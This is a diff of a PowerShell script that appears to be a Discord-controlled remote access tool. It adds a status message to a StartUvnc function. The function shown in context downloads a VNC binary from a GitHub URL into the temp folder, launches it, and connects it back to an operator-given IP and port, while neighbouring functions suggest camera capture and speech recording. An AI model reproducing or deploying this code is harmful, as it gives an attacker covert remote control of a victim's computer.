@@ -873,6 +873,7 @@ Function SpeechToText {
 Function StartUvnc{
     param([string]$ip,[string]$port)
 
+    sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
     $tempFolder = "$env:temp\vnc"
     $vncDownload = "https://github.com/beigeworm/assets/raw/main/winvnc.zip"
     $vncZip = "$tempFolder\winvnc.zip" 
@@ -890,6 +891,7 @@ Function StartUvnc{
     Start-Process $proc -ArgumentList ("-run")
     sleep 2
     Start-Process $proc -ArgumentList ("-connect $ip::$port")
+    
 }
 
 Function TakePicture {
